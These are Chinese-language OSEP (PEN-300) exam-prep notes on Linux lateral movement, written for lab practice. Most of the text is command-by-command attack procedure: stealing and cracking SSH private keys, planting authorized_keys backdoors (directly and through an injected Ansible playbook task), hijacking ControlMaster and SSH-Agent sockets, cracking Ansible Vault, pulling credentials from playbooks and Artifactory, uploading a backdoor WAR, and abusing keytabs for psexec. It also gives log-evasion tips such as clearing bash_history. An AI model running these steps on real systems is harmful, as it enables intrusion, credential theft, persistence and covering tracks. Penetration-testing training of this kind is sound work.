---
title: OSEP-11-Linux横向移动SSH与DevOps
description: '11-Linux后渗透 | 08-Linux横向移动SSH与DevOps'
pubDate: 2026-01-30T00:01:58+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Linux Machine
  - Active Directory
  - Lateral Movement
---

# Linux横向移动 - SSH与DevOps技术

## 概述

本文介绍Linux环境中的横向移动技术,包括SSH密钥窃取、会话劫持以及DevOps工具利用。

---

## 第一部分:SSH密钥窃取

### 1.1 查找私钥文件

```bash
# 查找默认名称的私钥
find /home/ -name "id_rsa" 2>/dev/null

# 查找所有可能的私钥文件
find /home/ -name "*.key" 2>/dev/null
find /home/ -name "*_rsa" 2>/dev/null
```

### 1.2 检查私钥是否有密码保护

```bash
cat svuser.key
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,351CBB3ECC54B554DD07029E2C377380
...
```

**关键标识:**
- `Proc-Type: 4,ENCRYPTED` - 表示密钥已加密
- `DEK-Info` - 显示加密算法

### 1.3 查找密钥使用目标

**方法1: 检查known_hosts**
```bash
cat ~/.ssh/known_hosts
```

**方法2: 检查bash历史**
```bash
tail ~/.bash_history
ssh -i ./svuser.key svuser@controller
```

### 1.4 破解SSH密钥密码

**步骤1: 转换为John格式**
```bash
python /usr/share/john/ssh2john.py svuser.key > svuser.hash
```

**步骤2: 使用John破解**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ./svuser.hash
```

**步骤3: 查看结果**
```
spongebob        (svuser.key)
```

### 1.5 使用窃取的密钥

```bash
# 设置正确权限
chmod 600 svuser.key

# 连接目标
ssh -i ./svuser.key svuser@controller
Enter passphrase for key './svuser.key': spongebob
```

---

## 第二部分:SSH持久化

### 2.1 添加公钥后门

**步骤1: 在攻击机生成密钥对**
```bash
ssh-keygen
# 接受默认值,不设密码
```

**步骤2: 查看公钥**
```bash
cat ~/.ssh/id_rsa.pub
```

**步骤3: 添加到目标authorized_keys**
```bash
echo "ssh-rsa AAAAB3NzaC1yc2E...kali@kali" >> /home/linuxvictim/.ssh/authorized_keys
```

**步骤4: 无密码登录**
```bash
ssh linuxvictim@linuxvictim
```

---

## 第三部分:SSH会话劫持

### 3.1 ControlMaster劫持

**原理:** ControlMaster允许多个SSH会话共享单个网络连接

**步骤1: 创建恶意配置**

在目标用户的`~/.ssh/config`中添加:
```
Host *
    ControlPath ~/.ssh/controlmaster/%r@%h:%p
    ControlMaster auto
    ControlPersist 10m
```

**步骤2: 等待用户连接**

当用户执行SSH连接时,会创建socket文件

**步骤3: 劫持连接**
```bash
# 查找socket文件
ls ~/.ssh/controlmaster/

# 使用现有socket连接
ssh -S ~/.ssh/controlmaster/offsec@linuxvictim:22 offsec@linuxvictim
```

### 3.2 SSH-Agent劫持

**原理:** SSH-Agent转发允许在中间服务器上使用本地密钥

**步骤1: 查找SSH_AUTH_SOCK**
```bash
# 以root身份查找
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380
```

**步骤2: 设置环境变量**
```bash
export SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380
```

**步骤3: 使用劫持的agent**
```bash
ssh-add -l  # 列出可用密钥
ssh user@target  # 使用劫持的密钥连接
```

---

## 第四部分:Ansible利用

### 4.1 识别Ansible控制节点

```bash
# 检查ansible命令
which ansible

# 检查配置目录
ls /etc/ansible/

# 检查主机清单
cat /etc/ansible/hosts
```

### 4.2 Ad-hoc命令执行

```bash
# 以当前用户执行
ansible victims -a "whoami"

# 以root执行
ansible victims -a "whoami" --become
```

### 4.3 从Playbook提取凭据

**查找硬编码密码:**
```bash
grep -r "ansible_become_pass" /opt/playbooks/
grep -r "password" /opt/playbooks/
```

**示例Playbook中的密码:**
```yaml
vars:
    ansible_become_pass: lab
```

### 4.4 破解Ansible Vault

**步骤1: 提取加密字符串**
```yaml
$ANSIBLE_VAULT;1.1;AES256
39363631613935326235383232616639...
```

**步骤2: 转换格式**
```bash
python3 /usr/share/john/ansible2john.py ./test.yml > hash.txt
```

**步骤3: 使用Hashcat破解**
```bash
hashcat hash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt
```

**步骤4: 解密**
```bash
ansible-vault decrypt test.yml --vault-password-file pw.txt
# 如果只想查看而不改写文件：
ansible-vault view test.yml --vault-password-file pw.txt
```

### 4.5 注入恶意Playbook任务

```yaml
# 添加SSH后门
- name: Update keys
  lineinfile:
    path: /root/.ssh/authorized_keys
    line: "ssh-rsa AAAAB3NzaC1... attacker@kali"
    insertbefore: EOF
```

---

## 第五部分:Artifactory利用

### 5.1 什么是Artifactory?

Artifactory是一个二进制仓库管理器,用于存储:
- 软件包
- Docker镜像
- 构建产物

### 5.2 枚举Artifactory

```bash
# 列出仓库
curl -s http://artifactory:8081/artifactory/api/repositories

# 搜索文件
curl -s "http://artifactory:8081/artifactory/api/search/artifact?name=*.war"
```

### 5.3 下载敏感文件

```bash
# 下载配置文件
curl -O http://artifactory:8081/artifactory/libs-release/config.properties

# 下载WAR文件
curl -O http://artifactory:8081/artifactory/libs-release/app.war
```

### 5.4 上传恶意文件

```bash
# 上传后门WAR
curl -u admin:password -T backdoor.war "http://artifactory:8081/artifactory/libs-release/backdoor.war"
```

---

## 第六部分:Linux Kerberos攻击

### 6.1 Linux加入AD域

Linux可以通过以下方式加入AD域:
- SSSD (System Security Services Daemon)
- Winbind
- realmd

### 6.2 获取Kerberos票据

```bash
# 使用kinit获取TGT
kinit offsec@CORP1.COM
Password for offsec@CORP1.COM:

# 查看票据
klist
```

### 6.3 使用keytab文件

```bash
# 查找keytab文件
find / -name "*.keytab" 2>/dev/null

# 使用keytab获取票据
kinit -k -t /etc/krb5.keytab host/linuxvictim.corp1.com@CORP1.COM
```

### 6.4 从Linux攻击Windows

```bash
# 使用Kerberos票据访问Windows共享
smbclient //dc01.corp1.com/C$ -k

# 使用impacket工具
python3 psexec.py -k -no-pass corp1.com/offsec@dc01.corp1.com
```

---

## 常见问题

### Q1: 如何避免SSH连接被记录?

- 使用现有的ControlMaster socket
- 通过SSH-Agent转发
- 清除bash_history

### Q2: Ansible需要什么权限?

- 需要能够以ansible用户身份运行命令
- 或者能够修改Playbook文件

### Q3: 如何检测SSH劫持?

- 监控异常的socket文件
- 检查SSH配置更改
- 审计SSH连接日志

---

## 练习

1. 在实验环境中查找并破解SSH私钥密码
2. 设置ControlMaster并演示会话劫持
3. 使用Ansible执行远程命令
4. 从Playbook中提取凭据
5. 使用Linux Kerberos票据访问Windows资源

---

## 本文件与详细指南的分工

本文件保留 Linux 横向移动总览和攻击链顺序；专项细节优先跳转到下面文件，避免同一内容在多处维护。

| 专题 | 主看文件 |
|---|---|
| Ansible 枚举、Vault、Playbook 利用 | `11-Linux后渗透/05-Ansible利用.md` |
| Artifactory 备份、数据库、管理员凭据 | `11-Linux后渗透/06-Artifactory利用.md` |
| Linux Kerberos、keytab、ccache、Impacket | `11-Linux后渗透/07-Linux-Kerberos.md` |
| 考试快速判断 | `11-Linux后渗透/10-Linux域内横向移动考试速查.md` |

考试可用总结：先用本文件建立“SSH -> Agent/ControlMaster -> DevOps -> Kerberos”的链路，再到专项文件抄命令和排错。
